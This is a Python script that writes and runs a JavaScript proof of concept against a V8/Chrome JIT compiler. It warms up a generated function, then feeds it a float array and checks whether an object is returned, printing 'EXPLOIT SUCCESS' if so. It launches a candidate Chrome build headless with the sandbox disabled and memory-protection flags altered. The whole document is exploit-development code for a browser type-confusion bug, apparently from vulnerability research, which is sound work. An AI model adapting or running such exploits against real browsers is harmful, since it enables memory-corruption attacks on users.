import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let lines = [];
lines.push("function testC(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push("  arr[0] = obj;");
lines.push("  let r = 0;");
lines.push("  while (r < 1) {");
lines.push("    r = arr[1];");
lines.push("    break;");
lines.push("  }");
lines.push("  return r;");
lines.push("}");
lines.push("return testC;");

let fn = new Function(lines.join("\\n"))();
let dummy = { a: 1 };
let dummy_arr = [1.1, 2.2, 3.3];

for (let i = 0; i < 20000; i++) fn(i, dummy_arr, dummy);
console.log("Warmup done for testC, scheduled check in 500ms...");

setTimeout(() => {
  console.log("Executing in setTimeout callback...");
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1000, farr, dummy);
  console.log("RESULT type:", typeof res, "value:", res);
  if (typeof res === "object") {
    console.log("=== EXPLOIT SUCCESS! Object:", res, "===");
  }
}, 500);
</script></body></html>"""

with open("script/testC_timeout.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/testC_timeout.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if "testC" in line or "RESULT" in line or "SUCCESS" in line or "CONSOLE" in line:
        print(line)
